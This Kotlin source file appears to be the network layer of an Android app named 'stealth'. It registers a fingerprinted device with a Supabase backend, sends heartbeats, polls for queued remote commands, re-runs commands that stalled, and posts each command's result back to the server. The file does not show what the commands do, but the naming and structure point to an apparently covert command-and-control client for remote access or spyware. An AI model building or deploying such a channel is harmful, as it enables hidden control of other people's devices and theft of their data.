package com.kaze.stealth

import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object Transport {
    private const val TAG = "STEALTH"
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val jsonType = "application/json; charset=utf-8".toMediaType()

    private fun headers(): Map<String, String> = mapOf(
        "apikey" to Config.SUPABASE_KEY,
        "Authorization" to "Bearer ${Config.SUPABASE_KEY}",
        "Content-Type" to "application/json",
        "Prefer" to "return=minimal"
    )

    private fun supabasePost(table: String, body: JSONObject): Boolean {
        return try {
            val url = "${Config.SUPABASE_REST}/$table"
            val reqBuilder = Request.Builder().url(url).post(body.toString().toRequestBody(jsonType))
            headers().forEach { (k, v) -> reqBuilder.addHeader(k, v) }
            val resp = client.newCall(reqBuilder.build()).execute()
            resp.close()
            resp.isSuccessful
        } catch (e: Exception) {
            Log.e(TAG, "supabasePost error: ${e.message}")
            false
        }
    }

    private fun supabaseSelect(table: String, query: String): String? {
        return try {
            val url = "${Config.SUPABASE_REST}/$table?$query"
            val reqBuilder = Request.Builder().url(url).get()
            headers().forEach { (k, v) -> reqBuilder.addHeader(k, v) }
            reqBuilder.addHeader("Prefer", "return=representation")
            val resp = client.newCall(reqBuilder.build()).execute()
            val body = resp.body?.string() ?: ""
            resp.close()
            if (resp.isSuccessful) body else null
        } catch (e: Exception) {
            Log.e(TAG, "supabaseSelect error: ${e.message}")
            null
        }
    }

    private fun supabaseUpdate(table: String, match: JSONObject, patch: JSONObject): Boolean {
        return try {
            val filter = match.keys().asSequence().joinToString("&") { key ->
                "$key=eq.${match.getString(key)}"
            }
            val url = "${Config.SUPABASE_REST}/$table?$filter"
            val reqBuilder = Request.Builder().url(url)
                .patch(patch.toString().toRequestBody(jsonType))
            headers().forEach { (k, v) -> reqBuilder.addHeader(k, v) }
            val resp = client.newCall(reqBuilder.build()).execute()
            resp.close()
            resp.isSuccessful
        } catch (e: Exception) {
            Log.e(TAG, "supabaseUpdate error: ${e.message}")
            false
        }
    }

    fun registerDevice(deviceId: String, fingerprint: String) {
        val body = JSONObject().apply {
            put("id", deviceId)
            put("fingerprint", fingerprint)
            put("last_seen", "now()")
            put("is_active", true)
        }
        supabasePost(Config.TABLE_DEVICES, body)
    }

    fun updateHeartbeat(deviceId: String) {
        val match = JSONObject().put("id", deviceId)
        val patch = JSONObject().apply {
            put("last_seen", "now()")
            put("is_active", true)
        }
        supabaseUpdate(Config.TABLE_DEVICES, match, patch)
    }

    fun pollCommands(deviceId: String): List<Pair<String, String>> {
        val maxAgeMs = System.currentTimeMillis() - Config.MAX_COMMAND_AGE_MS
        val maxAgeIso = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).apply {
            timeZone = java.util.TimeZone.getTimeZone("UTC")
        }.format(java.util.Date(maxAgeMs))

        val encoded = java.net.URLEncoder.encode(
            "device_id=eq.$deviceId&status=eq.pending&created_at=gt.$maxAgeIso&order=created_at.asc&limit=5",
            "UTF-8"
        )
        val resp = supabaseSelect(Config.TABLE_COMMANDS, encoded) ?: return emptyList()
        val commands = mutableListOf<Pair<String, String>>()
        try {
            val arr = JSONArray(resp)
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                val id = obj.getString("id")
                val cmd = obj.getString("command")
                commands.add(id to cmd)
            }
        } catch (e: Exception) {
            Log.e(TAG, "pollCommands parse error: ${e.message}")
        }
        return commands
    }

    fun markCommandFailed(commandId: String) {
        val match = JSONObject().put("id", commandId)
        val patch = JSONObject().put("status", "failed")
        supabaseUpdate(Config.TABLE_COMMANDS, match, patch)
    }

    /**
     * Reset stale "running" commands back to "pending" so they can be re-executed.
     * Called on startup to handle commands stuck in "running" due to process freeze.
     */
    fun cleanupStaleCommands(deviceId: String) {
        try {
            val encoded = java.net.URLEncoder.encode(
                "device_id=eq.$deviceId&status=eq.running",
                "UTF-8"
            )
            val resp = supabaseSelect(Config.TABLE_COMMANDS, encoded) ?: return
            val arr = JSONArray(resp)
            for (i in 0 until arr.length()) {
                val id = arr.getJSONObject(i).getString("id")
                val match = JSONObject().put("id", id)
                val patch = JSONObject().put("status", "pending")
                supabaseUpdate(Config.TABLE_COMMANDS, match, patch)
                Log.d(TAG, "Reset stale running command: $id")
            }
        } catch (e: Exception) {
            Log.e(TAG, "cleanupStaleCommands error: ${e.message}")
        }
    }

    fun markCommandRunning(commandId: String) {
        val match = JSONObject().put("id", commandId)
        val patch = JSONObject().put("status", "running")
        supabaseUpdate(Config.TABLE_COMMANDS, match, patch)
    }

    fun markCommandCompleted(commandId: String) {
        val match = JSONObject().put("id", commandId)
        val patch = JSONObject().apply {
            put("status", "completed")
            put("completed_at", "now()")
        }
        supabaseUpdate(Config.TABLE_COMMANDS, match, patch)
    }

    fun sendResult(commandId: String, deviceId: String, result: String): Boolean {
        val body = JSONObject().apply {
            put("command_id", commandId)
            put("device_id", deviceId)
            put("result", result)
        }
        return supabasePost(Config.TABLE_RESULTS, body)
    }

    fun saveFcmToken(deviceId: String, token: String) {
        val match = JSONObject().put("id", deviceId)
        val patch = JSONObject().put("fcm_token", token)
        supabaseUpdate(Config.TABLE_DEVICES, match, patch)
    }
}
